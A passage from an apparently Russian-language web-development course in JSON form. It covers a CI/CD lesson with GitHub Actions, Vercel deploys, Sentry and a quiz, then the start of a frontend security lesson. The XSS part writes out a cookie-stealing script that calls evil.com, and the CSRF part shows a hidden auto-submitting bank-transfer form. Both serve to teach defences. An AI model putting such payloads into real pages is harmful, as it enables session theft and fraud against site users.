      "overview": "В современной разработке код попадает в продакшн не через ручную загрузку по FTP, а через полностью автоматизированный конвейер CI/CD (Continuous Integration / Continuous Delivery).\n\nЗадача CI/CD — гарантировать, что каждое изменение кода автоматически проверяется (линтинг, тесты, сборка), проходит ревью на Preview-окружении и безопасно доставляется на Production с возможностью мгновенного отката (Rollback) при обнаружении ошибок. В этом уроке мы разберём архитектуру CI/CD конвейера, настроим GitHub Actions, освоим Preview Deployments и стратегии безопасного деплоя.",
      "sections": [
        {
          "title": "Что такое CI/CD и зачем нужна автоматизация",
          "content": "CI/CD состоит из двух дисциплин:\n\n1. **CI — Continuous Integration (Непрерывная Интеграция)**:\n- Разработчики ежедневно вливают свой код в общую ветку (main/develop).\n- При каждом `git push` или Pull Request автоматически запускаются проверки: линтинг кода (ESLint, Prettier), модульные тесты (Vitest), TypeScript-компиляция и сборка бандла (Vite Build).\n- Если хотя бы одна проверка падает — мерж блокируется (Branch Protection Rules).\n\n2. **CD — Continuous Delivery / Deployment (Непрерывная Доставка)**:\n- После успешного прохождения CI код автоматически деплоится на Preview-окружение (для Pull Request) или на Production (при мерже в main).\n- Continuous Delivery: деплой на прод требует ручного нажатия кнопки.\n- Continuous Deployment: деплой на прод происходит полностью автоматически после CI.\n\nПочему CI/CD критически важен:\n- Устраняет «Работает на моём компьютере» — код проверяется в стандартизированной среде (Ubuntu в облаке).\n- Предотвращает деградацию качества: тесты ловят баги ДО попадания в прод.\n- Ускоряет Time-to-Market: от коммита до продакшна — минуты, а не дни.",
          "image": {
            "src": "/images/lessons/web-ci-cd-pipeline.svg",
            "alt": "CI/CD конвейер: Lint, Test, Build, Preview, Deploy и мониторинг Sentry",
            "caption": "Конвейер CI/CD: каждый git push запускает Lint → Test → Build → Preview → Deploy. Sentry и Lighthouse CI мониторят после деплоя"
          },
          "codeExample": {
            "language": "bash",
            "code": "# .github/workflows/ci.yml — Полный конвейер CI\nname: CI Pipeline\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  lint-test-build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n      - run: npm ci          # Чистая установка зависимостей\n      - run: npm run lint    # ESLint + Prettier\n      - run: npm test        # Vitest Unit Tests\n      - run: npm run build   # TypeScript + Vite build",
            "title": "Полный CI конвейер в GitHub Actions: Lint → Test → Build",
            "explanation": "npm ci устанавливает зависимости из lock-файла для воспроизводимости. Каждый этап (lint, test, build) блокирует мерж при ошибке."
          }
        },
        {
          "title": "Этапы конвейера: Lint, Test, Build и защита веток",
          "content": "Каждый этап конвейера CI решает свою задачу:\n\n1. **Lint (Статический анализ кода)**:\n- ESLint проверяет качество и паттерны кода (неиспользуемые переменные, отсутствие return, опасные конструкции).\n- Prettier гарантирует единый стиль форматирования (отступы, кавычки, точки с запятой).\n- `npm run lint` должен завершаться с кодом 0 (успех).\n\n2. **Test (Автоматизированные тесты)**:\n- Unit-тесты (Vitest) проверяют утилиты, хелперы и редьюсеры за миллисекунды.\n- Integration-тесты (Testing Library) проверяют компоненты с моками API.\n- E2E-тесты (Playwright) — опционально на CI для критических сценариев.\n\n3. **Build (Сборка продакшн-бандла)**:\n- `tsc` (TypeScript) проверяет типы на этапе компиляции.\n- Vite/Webpack создаёт минифицированный бандл с Tree Shaking.\n- Ошибки типов или сборки мгновенно блокируют мерж.\n\n4. **Branch Protection Rules (GitHub)**:\n- Запрет прямого push в main (только через Pull Request).\n- Обязательное прохождение всех CI-проверок перед мержем.\n- Обязательный ревью от минимум 1 коллеги (Code Review).",
          "codeExample": {
            "language": "json",
            "code": "// package.json — скрипты CI/CD\n{\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"tsc && vite build\",\n    \"preview\": \"vite preview\",\n    \"lint\": \"eslint src/ --ext .ts,.tsx --max-warnings 0\",\n    \"lint:fix\": \"eslint src/ --ext .ts,.tsx --fix\",\n    \"format\": \"prettier --write 'src/**/*.{ts,tsx,css}'\",\n    \"test\": \"vitest run\",\n    \"test:watch\": \"vitest\",\n    \"test:coverage\": \"vitest run --coverage\",\n    \"typecheck\": \"tsc --noEmit\"\n  }\n}",
            "title": "Скрипты package.json для CI конвейера",
            "explanation": "--max-warnings 0 превращает предупреждения ESLint в ошибки, блокируя мерж. tsc --noEmit проверяет типы без генерации файлов."
          }
        },
        {
          "title": "Preview Deployments и среды (Environments)",
          "content": "Среды развертывания фронтенд-приложения:\n\n1. **Development (Local)**: `npm run dev` — локальный Vite-сервер с HMR.\n\n2. **Preview Deployment (PR Preview)**:\n- Каждый Pull Request автоматически получает уникальный URL для ревью (напр. `https://my-project-pr-42.vercel.app`).\n- Ревьюер открывает Preview URL и тестирует функциональность визуально, не скачивая ветку.\n- Vercel, Netlify и Cloudflare Pages генерируют Preview URL автоматически при каждом пуше в PR.\n\n3. **Staging (Предпродакшн)**:\n- Полная копия Production с реальными данными (или синтетическими).\n- QA-инженеры и Product Managers проводят приёмочное тестирование (UAT).\n\n4. **Production (Продакшн / CDN Edge)**:\n- Финальная версия для реальных пользователей.\n- Статические файлы раздаются через CDN Edge Network (Cloudflare, Vercel Edge, AWS CloudFront) с минимальной задержкой по всему миру.\n\nПеременные окружения (Environment Variables):\n`.env.development` (локальные ключи), `.env.production` (продакшн API URLs). В CI переменные хранятся в Secrets (GitHub) или Environment Variables (Vercel).",
          "codeExample": {
            "language": "bash",
            "code": "# Автоматический деплой на Vercel через GitHub Actions\nname: Deploy to Vercel\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n      - run: npm ci\n      - run: npm run build\n\n      - name: Deploy to Vercel Production\n        uses: amondnet/vercel-action@v25\n        with:\n          vercel-token: ${{ secrets.VERCEL_TOKEN }}\n          vercel-org-id: ${{ secrets.VERCEL_ORG_ID }}\n          vercel-project-id: ${{ secrets.VERCEL_PROJECT_ID }}\n          vercel-args: '--prod'",
            "title": "Автоматический Deploy на Vercel через GitHub Actions",
            "explanation": "Secrets хранят токены безопасно. Vercel Action деплоит бандл на CDN. Каждый PR автоматически получает Preview URL для ревью."
          }
        },
        {
          "title": "Стратегии деплоя и мониторинг после релиза",
          "content": "Стратегии безопасного выпуска обновлений:\n\n1. **Rolling Deploy (По умолчанию)**:\nНовая версия постепенно заменяет старую на серверах. Если ошибки — автоматический откат.\n\n2. **Blue-Green Deployment**:\nДва идентичных окружения: Blue (текущий прод) и Green (новая версия). Переключение трафика происходит мгновенно через DNS или Load Balancer. При ошибках — мгновенный откат на Blue.\n\n3. **Canary Deployment (Канарейка)**:\n1–5% реальных пользователей получают новую версию. Мониторинг ошибок и метрик. При успехе — постепенное расширение до 100%. При росте ошибок — мгновенный откат.\n\nМониторинг после деплоя:\n\n1. **Sentry** — отслеживание ошибок JavaScript в реальном времени:\n- Автоматически перехватывает необработанные исключения, промисы и сетевые ошибки.\n- Source Maps позволяют видеть номер строки исходного кода (не минифицированного бандла!).\n\n2. **Lighthouse CI** — автоматическая проверка Web Vitals:\n- LCP, FID, CLS проверяются после каждого деплоя.\n- При деградации метрик (LCP > 2.5с) — алерт и автоматический Rollback.\n\n3. **Grafana / Datadog** — дашборды метрик, алертинг и трейсинг.",
          "codeExample": {
            "language": "javascript",
            "code": "// Инициализация Sentry для мониторинга ошибок в продакшне\nimport * as Sentry from '@sentry/react';\n\nSentry.init({\n  dsn: 'https://xxxxx@sentry.io/project-id',\n  environment: import.meta.env.MODE,         // 'production' | 'staging'\n  release: import.meta.env.VITE_APP_VERSION, // '2.4.1'\n  \n  integrations: [\n    Sentry.browserTracingIntegration(),       // Трейсинг запросов\n    Sentry.replayIntegration()                // Запись сессий с ошибками\n  ],\n  \n  tracesSampleRate: 0.1,  // 10% запросов трейсятся\n  replaysOnErrorSampleRate: 1.0  // 100% сессий с ошибками записываются\n});",
            "title": "Подключение Sentry для мониторинга ошибок в Production",
            "explanation": "Sentry перехватывает необработанные ошибки, привязывает их к Source Maps для читаемых стек-трейсов и записывает сессии пользователей для воспроизведения багов."
          }
        },
        {
          "title": "Рекомендуемые видеоматериалы: CI/CD и GitHub Actions",
          "content": "Для наглядного и практического освоения Continuous Integration, Continuous Delivery и автоматизации конвейеров рекомендуем видеоматериалы:\n\n- **[CI CD наглядные примеры (YouTube)](https://youtu.be/ANj7qUgzNq4?si=NjvrVMULWRIjIfTr)** — наглядный видеоразбор от Ulbi TV: что такое CI/CD, архитектура конвейера, автоматизация тестирования, сборки и деплоя с живыми примерами и разбором пайплайнов.\n- **[Github Actions - Введение в CI/CD (YouTube)](https://youtu.be/e0A2hDObLmg?si=iaoNQG3XpDnz0oQL)** — подробный практический видеоурок от Владилена Минина: настройка GitHub Actions с нуля, создание workflow-файлов, триггеры (push, pull_request), jobs, steps, работа с secrets и автоматический деплой."
        }
      ],
      "seniorTips": [
        "Всегда настраивайте Branch Protection Rules: запрет push в main, обязательный CI и минимум 1 Code Review.",
        "Используйте Preview Deployments для каждого Pull Request — ревьюер должен иметь возможность открыть живой URL и протестировать визуально.",
        "Загружайте Source Maps в Sentry при каждом релизе — без них стек-трейсы ошибок из минифицированного бандла нечитаемы.",
        "Настройте Lighthouse CI в конвейере для автоматической проверки Web Vitals после каждого деплоя."
      ],
      "commonMistakes": [
        {
          "bad": "# Хранение API-ключей в коде\nconst API_KEY = 'sk_live_abc123secret'; // ❌ Утечка в Git!",
          "good": "# Использование переменных окружения\nconst API_KEY = import.meta.env.VITE_API_KEY;\n# Secrets хранятся в GitHub Secrets / Vercel Environment Variables",
          "reason": "Ключи в коде попадают в Git-историю и доступны всем, кто имеет доступ к репозиторию. Переменные окружения хранятся безопасно вне кода."
        },
        {
          "bad": "# Деплой без тестов\ngit push origin main  # Прямой деплой без CI!",
          "good": "# Создание PR → CI (lint + test + build) → Code Review → Merge → CD",
          "reason": "Прямой push без CI позволяет сломанному коду попасть в продакшн, вызывая простой сервиса для реальных пользователей."
        },
        {
          "bad": "# npm install в CI\nrun: npm install  # Нестабильно! Может установить другие версии",
          "good": "run: npm ci  # Чистая установка строго из package-lock.json",
          "reason": "npm install может обновить зависимости до новых минорных версий, нарушив воспроизводимость сборки. npm ci устанавливает ровно те версии, которые зафиксированы в lock-файле."
        }
      ],
      "keyTakeaways": [
        "CI автоматически проверяет каждый push/PR: Lint (ESLint) → Test (Vitest) → Build (tsc + Vite).",
        "CD автоматически доставляет проверенный код на Preview, Staging и Production.",
        "Preview Deployments дают каждому PR уникальный URL для визуального ревью до мержа.",
        "Стратегии Canary и Blue-Green обеспечивают безопасный деплой с мгновенным Rollback.",
        "Sentry и Lighthouse CI мониторят ошибки и Web Vitals после каждого релиза."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"cicd-app\">\n  <h3>Симулятор CI/CD Pipeline</h3>\n  <button id=\"run-pipeline\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">▶ Запустить Pipeline</button>\n  <div id=\"pipeline-stages\" style=\"margin-top:16px;\"></div>\n</div>",
      "initialCss": "#cicd-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }\n.stage { padding: 8px 12px; margin-bottom: 6px; border-radius: 4px; border-left: 3px solid; }\n.stage-pending { border-color: #8b949e; color: #8b949e; }\n.stage-running { border-color: #ffb02e; color: #ffb02e; }\n.stage-pass { border-color: #2dff8a; color: #2dff8a; background: rgba(45,255,138,0.05); }\n.stage-fail { border-color: #f85149; color: #f85149; background: rgba(248,81,73,0.05); }",
      "initialJs": "const stages = ['Lint (ESLint)', 'Unit Tests (Vitest)', 'TypeScript Check', 'Build (Vite)', 'Deploy Preview'];\nconst container = document.getElementById('pipeline-stages');\n\nasync function runPipeline() {\n  container.innerHTML = stages.map(s => `<div class='stage stage-pending'>⏳ ${s}</div>`).join('');\n  const els = container.querySelectorAll('.stage');\n  \n  for (let i = 0; i < stages.length; i++) {\n    els[i].className = 'stage stage-running';\n    els[i].textContent = `⚙️ Running: ${stages[i]}...`;\n    await new Promise(r => setTimeout(r, 800 + Math.random() * 400));\n    els[i].className = 'stage stage-pass';\n    els[i].textContent = `✅ ${stages[i]} — Passed`;\n  }\n}\n\ndocument.getElementById('run-pipeline').onclick = runPipeline;",
      "instructions": "Практика с CI/CD:\n1. Нажмите 'Запустить Pipeline' и наблюдайте этапы Lint → Test → Build → Deploy\n2. Добавьте этап 'E2E Tests (Playwright)' в массив stages\n3. Добавьте случайный сбой (Math.random() < 0.2) для имитации падения тестов"
    },
    "task": {
      "title": "Написание конфигурации GitHub Actions CI/CD с тестами, Preview Deploy и мониторингом",
      "scenario": "Вам необходимо настроить полный CI/CD конвейер для фронтенд-проекта на GitHub Actions: при каждом Pull Request должны запускаться этапы Lint, TypeScript Check, Unit Tests и Build; при мерже в main — деплой на Vercel Production; а после деплоя — проверка Lighthouse CI.",
      "criteria": [
        "Workflow запускается на push в main и на pull_request",
        "Этапы выполняются последовательно: npm ci → lint → typecheck → test → build",
        "Используется actions/setup-node с кэшированием npm",
        "При мерже в main выполняется деплой на Vercel с --prod",
        "Секреты (VERCEL_TOKEN) хранятся в GitHub Secrets"
      ],
      "starterCode": {
        "html": "# Напишите .github/workflows/ci.yml\n# Ваш код"
      },
      "hints": [
        "Используйте runs-on: ubuntu-latest и actions/checkout@v4",
        "Для кэширования: actions/setup-node@v4 с cache: 'npm'",
        "Для деплоя: amondnet/vercel-action@v25 с secrets"
      ],
      "solution": {
        "html": "name: CI/CD Pipeline\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n\njobs:\n  ci:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 22\n          cache: 'npm'\n      - run: npm ci\n      - run: npm run lint\n      - run: npx tsc --noEmit\n      - run: npm test\n      - run: npm run build\n\n  deploy:\n    needs: ci\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with: { node-version: 22, cache: 'npm' }\n      - run: npm ci && npm run build\n      - uses: amondnet/vercel-action@v25\n        with:\n          vercel-token: ${{ secrets.VERCEL_TOKEN }}\n          vercel-org-id: ${{ secrets.VERCEL_ORG_ID }}\n          vercel-project-id: ${{ secrets.VERCEL_PROJECT_ID }}\n          vercel-args: '--prod'",
        "explanation": "Job ci проверяет код на каждом PR. Job deploy запускается только при мерже в main (if: github.ref == 'refs/heads/main') и деплоит на Vercel Production через Secrets."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro9-q1",
          "question": "Команда настроила автоматические проверки на каждый запрос слияния, но выкладка по-прежнему делается вручную по чек-листу. Какая из практик уже внедрена?",
          "options": [
            "Непрерывная интеграция; непрерывной доставки пока нет",
            "Непрерывная доставка; интеграцию обычно настраивают позже",
            "Обе сразу: ручная выкладка тоже считается доставкой",
            "Ни одна: обе требуют полностью автоматического выката в продакшен"
          ],
          "correctIndex": 0,
          "explanation": "Интеграция отвечает за то, чтобы каждое изменение автоматически проверялось: линтер, типы, тесты, сборка. Доставка — за то, чтобы проверенная сборка так же автоматически попадала в нужное окружение. Здесь первая половина есть, вторая отсутствует. Ручной чек-лист как раз и есть источник человеческих ошибок, ради устранения которых доставку автоматизируют."
        },
        {
          "id": "pro9-q2",
          "question": "Ключ доступа к платёжному шлюзу оказался прямо в коде и попал в репозиторий. Достаточно ли убрать его новым коммитом?",
          "options": [
            "Да: после удаляющего коммита старое значение больше нигде не хранится",
            "Нет: значение остаётся в истории, ключ нужно отозвать и выпустить заново",
            "Да, если дополнительно внести файл в список игнорируемых системой",
            "Нет, но достаточно на время сделать репозиторий приватным"
          ],
          "correctIndex": 1,
          "explanation": "История хранит все версии файлов: ключ достаётся одной командой просмотра прошлых коммитов, а на публичном репозитории его наверняка уже собрали автоматические сканеры. Единственно верный порядок действий — немедленно отозвать ключ у провайдера, выпустить новый, положить его в защищённое хранилище секретов и только потом чистить историю. Секреты в коде не хранят никогда, даже во временных ветках."
        },
        {
          "id": "pro9-q3",
          "question": "Зачем каждому запросу на слияние выдавать отдельный адрес с собранной версией приложения?",
          "options": [
            "Чтобы ускорить сборку основной ветки за счёт переиспользования общего кеша",
            "Чтобы ревьюер мог проверить изменения вживую, не разворачивая ветку у себя",
            "Чтобы автоматически прогонять на нём нагрузочное тестирование сервиса",
            "Чтобы сохранять историю версий приложения для возможного отката"
          ],
          "correctIndex": 1,
          "explanation": "Читать код полезно, но многие проблемы видны только глазами: съехавшая вёрстка на мобильном, неудачная формулировка ошибки, сломанный переход между экранами. Отдельный адрес позволяет открыть изменения и проверить их дизайнеру, менеджеру и тестировщику, ничего не устанавливая. Заодно это репетиция настоящей сборки: если она падает, вы узнаете об этом до слияния."
        },
        {
          "id": "pro9-q4",
          "question": "Чем канареечная выкладка отличается от сине-зелёной?",
          "options": [
            "Канареечная переключает трафик целиком, а сине-зелёная — постепенно по долям",
            "Канареечная применяется только к базам данных, а сине-зелёная — к приложениям",
            "Канареечная пускает на новую версию малую долю трафика, сине-зелёная переключает разом",
            "Обе означают одно и то же и различаются лишь названием у разных провайдеров"
          ],
          "correctIndex": 2,
          "explanation": "При канареечной выкладке новая версия сначала обслуживает несколько процентов пользователей, команда смотрит на ошибки и метрики и постепенно расширяет долю. При сине-зелёной рядом поднимается полное второе окружение, и трафик переключается на него одним движением — зато и откат мгновенный, достаточно вернуть переключатель. Первый подход снижает радиус поражения, второй — время отката."
        },
        {
          "id": "pro9-q5",
          "question": "Зачем выгружать карты исходников в систему мониторинга ошибок, но не отдавать их браузеру?",
          "options": [
            "Карты содержат ключи сборки, необходимые для проверки подлинности релиза",
            "Карты ускоряют разбор ошибок в браузере и снижают нагрузку на устройство",
            "Без них система мониторинга не сможет группировать одинаковые ошибки вместе",
            "Стек вызовов станет читаемым для команды, а исходный код не попадёт к пользователям"
          ],
          "correctIndex": 3,
          "explanation": "В собранном коде имена сокращены, и стек вызовов выглядит как набор однобуквенных функций с номером строки в единственной длинной строке — отладить по нему невозможно. Карта сопоставляет это с исходником, но раздавать её всем подряд значит опубликовать исходный код приложения. Компромисс: карта загружается в систему мониторинга приватно и не выкладывается на сайт."
        }
      ]
    }
  },
  {
    "id": "pro-10",
    "moduleId": "pro",
    "level": 10,
    "title": "Безопасность фронтенда: XSS, CSRF, CSP, CORS и токены безопасности",
    "subtitle": "XSS атаки и санитизация, CSRF и SameSite cookies, Content Security Policy (CSP), CORS и безопасное хранение JWT",
    "description": "Освойте безопасность веб-приложений (Frontend AppSec): механизмы атак XSS (Stored, Reflected, DOM-based) и санитизацию через DOMPurify, защиту от CSRF через SameSite cookies и анти-CSRF токены, настройку заголовков Content Security Policy (CSP) и CORS, а также безопасное хранение токенов в HttpOnly cookies.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "security",
      "xss",
      "csrf",
      "csp",
      "cors",
      "jwt",
      "cookies",
      "dompurify",
      "appsec"
    ],
    "theory": {
      "overview": "Безопасность фронтенда (Frontend Application Security) — критически важная компетенция коммерческого инженера. Уязвимости на клиенте приводят к утечкам персональных данных, краже сессий и паролей, краже денег пользователей и компрометации бизнеса.\n\nВ этом уроке мы детально разберём главные уязвимости веб-приложений из рейтинга OWASP Top 10: XSS (межсайтовый скриптинг) и CSRF (подделку запросов), научимся настраивать защитные политики браузера Content Security Policy (CSP) и CORS, безопасно работать с DOM через санитизацию и правильно хранить JWT токены в `HttpOnly + Secure + SameSite=Strict` cookies.",
      "sections": [
        {
          "title": "XSS (Cross-Site Scripting): Виды атак и защита",
          "content": "XSS — атака, при которой злоумышленник умудряется внедрить и исполнить вредоносный JavaScript-код в браузере жертвы:\n\n3 Типа XSS атак:\n1. **Stored XSS (Хранимый)** — самый опасный!\nВредоносный скрипт сохраняется в базе данных (например, в тексте комментария: `<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>`). Каждый пользователь, открывший страницу с этим комментарием, заражается!\n\n2. **Reflected XSS (Отраженный)**:\nСкрипт передается в параметрах URL (`https://site.dev/search?q=<script>...`). Сервер вставляет параметр в ответ страницы без экранирования.\n\n3. **DOM-based XSS (На клиенте)**:\nУязвимость в самом коде фронтенда, когда непроверенные данные из `location.hash` или инпута вставляются напрямую через опасные методы `innerHTML`, `document.write` или `eval()`.\n\nПоследствия XSS:\n- Кража токенов авторизации и сессий из `localStorage` и `document.cookie`.\n- Кейлоггер (перехват вводимых данных кредитных карт и паролей).\n- Подмена контента страницы и форм авторизации (Фишинг).\n\nЗащита от XSS:\n- ✅ ВСЕГДА используйте `textContent` вместо `innerHTML` для вывода текста.\n- ✅ Для вывода форматированного HTML используйте библиотеку санитизации **`DOMPurify.sanitize(dirtyHtml)`**.\n- ✅ Никогда не используйте `eval()`, `new Function(str)` и `setTimeout(string)`.",
          "image": {
            "src": "/images/lessons/web-security-architecture.svg",
            "alt": "Безопасность веб-приложений: XSS, CSRF, CSP, CORS и HttpOnly Cookies",
            "caption": "XSS внедряет чужой скрипт (защита: DOMPurify/textContent/CSP). CSRF отправляет запрос от имени жертвы (защита: SameSite/CSRF-token). Хранение JWT в HttpOnly cookies"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// ❌ ОПАСНО: Уязвимо для DOM XSS!\nconst searchParam = new URLSearchParams(window.location.search).get('q');\n// document.getElementById('search-result').innerHTML = `Вы искали: ${searchParam}`;\n\n// ✅ БЕЗОПАСНО 1: Использование textContent (авто-экранирование)\nconst resultEl = document.getElementById('search-result');\nresultEl.textContent = `Вы искали: ${searchParam}`;\n\n// ✅ БЕЗОПАСНО 2: Санитизация HTML через библиотеку DOMPurify\nimport DOMPurify from 'dompurify';\nconst cleanHtml = DOMPurify.sanitize(userBioHtml);\nprofileBioContainer.innerHTML = cleanHtml; // Безопасно, опасные теги вырезаны!",
            "title": "Защита от XSS: textContent и санитизация через DOMPurify",
            "explanation": "textContent трактует любой тег <script> как обычный текст. DOMPurify удаляет скрипты, onerror-атрибуты и javascript: ссылки."
          }
        },
        {
          "title": "CSRF (Cross-Site Request Forgery): Механика и защита",
          "content": "CSRF — атака, заставляющая браузер авторизованного пользователя выполнить нежелательное действие на уязвимом сайте:\n\nКак работает CSRF:\n1. Жертва авторизована в интернет-банке `mybank.com` (куки авторизации сохранены в браузере).\n2. Жертва открывает вредоносный сайт `evil.com`.\n3. Сайт `evil.com` содержит скрытую форму: `<form action=\"https://mybank.com/api/transfer\" method=\"POST\"><input name=\"amount\" value=\"100000\" /><input name=\"to\" value=\"hacker\" /></form><script>document.forms[0].submit()</script>`.\n4. Браузер отправляет запрос на `mybank.com` и АВТОМАТИЧЕСКИ ПРИКРЕПЛЯЕТ авторизационные куки `mybank.com`!\n5. Банк выполняет перевод, считая запрос легитимным!\n\nЗащита от CSRF:\n\n1. **Атрибут `SameSite` на Cookies (Стандарт безопасности)**:\n- `SameSite=Strict` — куки НИКОГДА не отправляются при переходе со сторонних сайтов (100% защита от CSRF).\n- `SameSite=Lax` (по умолчанию в современных браузерах) — куки отправляются только при безопасных GET-переходах по ссылкам `<a>`, но блокируются при POST-запросах из чужих форм.\n- `SameSite=None; Secure` — куки отправляются отовсюду (требуется флаг HTTPS `Secure`).\n\n2. **Анти-CSRF токены (CSRF Tokens)**:\nСервер генерирует случайный криптостойкий токен и проверяет его в заголовке `X-CSRF-Token` при каждом мутирующем запросе (POST/PUT/DELETE). Сайт `evil.com` не может прочитать этот токен из-за политики Same-Origin Policy (SOP)!",
          "codeExample": {
            "language": "javascript",
            "code": "// Настройка заголовка X-CSRF-Token для API-запросов\nasync function secureApiPost(url, payload) {\n  // Считываем CSRF токен из мета-тега или cookie\n  const csrfToken = document.querySelector('meta[name=\"csrf-token\"]')?.content;\n\n  const response = await fetch(url, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'X-CSRF-Token': csrfToken // Злоумышленник с evil.com не может подставить этот заголовок!\n    },\n    body: JSON.stringify(payload)\n  });\n\n  return response.json();\n}",
            "title": "Защита API через заголовок X-CSRF-Token",
            "explanation": "Браузер отправляет X-CSRF-Token заголовок только со своего домена, защищая бэкенд от межсайтовых подделок запросов."
          }
        },
        {
          "title": "Заголовки безопасности: CSP, CORS, HSTS и X-Frame-Options",
          "content": "Заголовки HTTP, настраиваемые на веб-сервере для защиты фронтенда:\n\n1. **CSP — Content Security Policy (Политика защиты контента)**:\nСамый мощный инструмент защиты от XSS!\n`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';`\n- Браузер заблокирует выполнение ЛЮБОГО инлайн-скрипта или загрузку скрипта с домена, не указанного в белом списке CSP!\n\n2. **CORS — Cross-Origin Resource Sharing**:\n- Механизм, позволяющий серверу явно объявить, каким внешним доменам разрешен доступ к его API (`Access-Control-Allow-Origin: https://app.dev`).\n- Preflight OPTIONS запросы проверяют разрешения перед отправкой сложных методов (PUT/DELETE/кастомные заголовки).\n\n3. Другие критические заголовки:\n- `X-Frame-Options: DENY` — запрещает встраивать сайт в `<iframe>` на чужих ресурсах (защита от Clickjacking — кликджекинга).\n- `Strict-Transport-Security: max-age=31536000; includeSubDomains` (HSTS) — принудительно заставляет браузер общаться ТОЛЬКО по безопасному HTTPS.\n- `X-Content-Type-Options: nosniff` — запрещает браузеру исполнять файл как скрипт, если MIME-тип не совпадает.",
          "codeExample": {
            "language": "json",
            "code": "// Пример конфигурации защитных заголовков в vercel.json / nginx\n{\n  \"headers\": [\n    {\n      \"source\": \"/(.*)\",\n      \"headers\": [\n        {\n          \"key\": \"Content-Security-Policy\",\n          \"value\": \"default-src 'self'; script-src 'self' 'nonce-rAnd0m'; object-src 'none'; frame-ancestors 'none';\"\n        },\n        {\n          \"key\": \"X-Frame-Options\",\n          \"value\": \"DENY\"\n        },\n        {\n          \"key\": \"X-Content-Type-Options\",\n          \"value\": \"nosniff\"\n        },\n        {\n          \"key\": \"Strict-Transport-Security\",\n          \"value\": \"max-age=63072000; includeSubDomains; preload\"\n        }\n      ]\n    }\n  ]\n}",
            "title": "Защитные HTTP заголовки в vercel.json (CSP, HSTS, X-Frame-Options)",
            "explanation": "Комплекс заголовков блокирует XSS инъекции, запрещает встраивание в iframe (Clickjacking) и принудительно включает HTTPS."
          }
        },
        {
          "title": "Безопасное хранение JWT токенов: HttpOnly Cookie vs localStorage",
          "content": "Где хранить авторизационные JWT токены на фронтенде:\n\n1. **Почему `localStorage` — ЭТО ОПАСНО**:\n- Любой JavaScript-код на странице (включая сторонние аналитики, баннеры и XSS-скрипты) имеет прямой доступ к `localStorage.getItem('token')`!\n- Если на сайте возникнет малейшая XSS уязвимость — злоумышленник мгновенно украдет токен навсегда.\n\n2. **Стандарт Enterprise Security (HttpOnly Cookie)**:\n- Сервер устанавливает токен в Cookie с флагами: `Set-Cookie: token=jwt_xxx; HttpOnly; Secure; SameSite=Strict; Path=/`.\n- Флаг **`HttpOnly`** ЗАПРЕЩАЕТ доступ к куке из JavaScript (`document.cookie` не видит токен!). Ни один XSS-скрипт не сможет его украсть!\n- Флаг **`Secure`** разрешает передачу куки ТОЛЬКО по зашифрованному протоколу HTTPS.\n- Флаг **`SameSite=Strict`** защищает от CSRF-атак.\n\n3. Идеальная гибридная схема (Token Rotation):\n- **Refresh Token** (долгоживущий) хранится в `HttpOnly + Secure + SameSite=Strict` Cookie.\n- **Access Token** (короткоживущий, 5–15 минут) хранится только в оперативной памяти JS (переменная модуля) и обновляется в фоне через эндпоинт `/refresh`.",
          "codeExample": {
            "language": "javascript",
            "code": "// Архитектура безопасного хранения Access Token в памяти JS\nlet inMemoryAccessToken = null;\n\nexport const authService = {\n  setToken(token) {\n    inMemoryAccessToken = token; // Только в оперативной памяти!\n  },\n  getToken() {\n    return inMemoryAccessToken;\n  },\n  async refreshSession() {\n    // Refresh Token отправляется автоматически браузером в HttpOnly Cookie!\n    const response = await fetch('/api/auth/refresh', {\n      method: 'POST',\n      credentials: 'include' // Передача HttpOnly cookies\n    });\n    const data = await response.json();\n    inMemoryAccessToken = data.accessToken;\n    return inMemoryAccessToken;\n  },\n  logout() {\n    inMemoryAccessToken = null;\n    return fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });\n  }\n};",
            "title": "Безопасная архитектура: Access Token в памяти + Refresh в HttpOnly Cookie",
            "explanation": "Access token хранится в памяти переменной JS, а долгоживущий Refresh token защищен HttpOnly cookie, недоступным для XSS скриптов."
          }
        },
        {
          "title": "Рекомендуемые видеоуроки по безопасности и CORS",
          "content": "Для детального понимания механизмов защиты браузера, политики Same-Origin, работы CORS, Preflight-запросов (OPTIONS) и решения проблем с блокировкой запросов рекомендуем изучить видеоурок:\n\n- **[CORS простыми словами: что это, как работает и как исправить ошибки (YouTube)](https://youtu.be/aq_chBS-OI0?si=1Ag2B47o5pZ2B8kV)** — наглядный и практический видеоразбор Cross-Origin Resource Sharing, заголовков Access-Control-Allow-Origin, механизмов безопасности браузера и способов настройки бэкенда и проксирования.\n- **[Безопасность веб-приложений: XSS, CSRF и другие уязвимости простыми словами (YouTube)](https://youtu.be/ZFzn2AQPwRA?si=5_n5x7QsYHNOmvQF)** — подробный видеоразбор основных уязвимостей веб-приложений (XSS, CSRF, SQL-инъекции), механизмов защиты и лучших практик безопасной разработки фронтенда."
        }
      ],
      "seniorTips": [
        "Никогда не храните конфиденциальные токены сессий в `localStorage` — используйте `HttpOnly + Secure + SameSite=Strict` cookies.",
